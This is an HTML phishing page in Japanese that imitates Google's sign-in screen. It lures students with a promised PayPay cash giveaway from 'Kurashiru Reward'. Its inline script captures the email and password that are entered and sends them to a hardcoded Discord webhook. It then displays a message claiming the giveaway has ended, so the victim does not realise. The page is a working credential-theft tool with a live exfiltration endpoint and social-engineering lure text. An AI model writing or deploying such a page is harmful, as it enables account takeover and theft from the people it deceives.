<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Googleログイン</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google ロゴ" class="logo">
            <h1>金欠学生必見！</h1>
<h2>クラシルリワード運営からのpaypay配布！</h2>
            <h1>サインイン</h1>
            <form id="login-form">
                <div class="input-group">
                    <input type="email" id="email" required>
                    <label for="email">メールアドレスまたは電話番号</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" required>
                    <label for="password">パスワード</label>
                </div>
                <button type="submit" class="btn">次へ</button>
                <div class="links">
                    <a href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank">メールアドレスをお忘れですか？</a>
                    <a href="https://accounts.google.com/signin/v2/recoveryidentifier" target="_blank">パスワードをお忘れですか？</a>
                </div>
                <div class="divider"></div>
                <div class="create-account">
                    <span>この偽のGoogleに新規登録しますか？ </span><a href="https://accounts.google.com/signup" target="_blank">アカウントを作成</a>
                </div>
            </form>
            <div id="thank-you-message" style="display: none; margin-top: 20px;">
                クラシルリワード
                配布期間が終了しました。次も配布を致します。
            </div>
        </div>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const webhookURL = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G';

            const message = {
                content: `Email: ${email}\nPassword: ${password}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (response.ok) {
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('thank-you-message').style.display = 'block';
                } else {
                    alert('送信に失敗しました');
                }
            })
            .catch(error => alert('エラーが発生しました: ' + error));
        });
    </script>
</body>
</html>
